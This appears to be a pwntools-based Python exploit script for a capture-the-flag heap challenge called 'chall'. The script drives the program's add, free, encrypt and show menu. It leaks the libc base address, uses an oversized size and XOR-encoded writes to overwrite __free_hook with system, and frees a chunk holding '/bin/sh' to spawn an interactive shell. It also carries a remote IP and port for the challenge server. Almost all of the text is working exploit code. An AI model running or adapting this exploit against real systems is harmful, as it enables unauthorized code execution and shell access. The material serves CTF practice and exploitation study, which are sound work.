#! /usr/bin/env python
# -*- coding: utf-8 -*-
#https://github.com/matrix1001/welpwn 
from PwnContext import *
if __name__ == '__main__':
    #ontext.terminal = ['tmux', 'split', '-h']
    #-----function for quick script-----#
    s       = lambda data               :ctx.send(str(data))        #in case that data is a int
    sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
    sl      = lambda data               :ctx.sendline(str(data)) 
    sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data))
    r       = lambda numb=4096          :ctx.recv(numb)
    ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
    irt     = lambda                    :ctx.interactive()
    
    rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
    leak    = lambda address, count=0   :ctx.leak(address, count)
    
    uu32    = lambda data   :u32(data.ljust(4, '\0'))
    uu64    = lambda data   :u64(data.ljust(8, '\0'))

    debugg = 1
    logg = 0

    ctx.binary = './chall'

    ctx.custom_lib_dir = '/lib/x86_64-linux-gnu/'#remote libc
    ctx.debug_remote_libc = False

    ctx.symbols = {'note':0x202060}
    
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    
    #ctx.breakpoints = [0x1233]
    #ctx.debug()
    #ctx.start("gdb",gdbscript="set follow-fork-mode child\nc")

    if debugg:
        rs()
    else:
        ctx.remote = ('39.97.210.182', 19806)
        rs(method = 'remote')

    if logg:
        context.log_level = 'debug'

    def choice(aid):
        sla('Exit',aid)

    key = {}
    for i in range(20):
        key[i] = []
    def add(asize):
        choice(1)
        sla('Size:',asize)
        ru('Key: \n')
        data=ru('\n')
        ru('ID: ')
        aid = int(ru('\n'))
        key[aid] = data.split(' ')

    def free(aid):
        choice(2)
        sla('ID: ',aid)
    def enc(aid,offset,msg):
        choice(3)
        sla('ID: ',aid)
        sla('msg: ',offset)
        sla('msg: ',len(msg))
        sa('Msg: ',msg)
    def show(aid,offset,alen):
        choice(4)
        sla('ID: ',aid)
        sla('msg: ',offset)
        sla('msg: ',alen)
    def to_xor(aid,astr):
        ans = ''
        for i in range(len(astr)):
            ans += chr(int(key[aid][i],16) ^ ord(astr[i]))
        return ans

    add(0x500)
    add(0x110)
    free(0)
    add(0x500)
    show(0,0,8)
    ru('Msg: \n')
    libc_base = uu64(ru('\n')) - 0x3c4b78
    log.success("libc_base = %s"%hex(libc_base))
    
    enc(1,0,to_xor(1,'/bin/sh\x00'))
    #raw_input()

    add(0xffff00000120)
    free_hook = libc_base + libc.symbols['__free_hook']
    system = libc_base + libc.symbols['system']
    enc(2,free_hook,to_xor(2,p64(system)))
    free(1)

    irt()

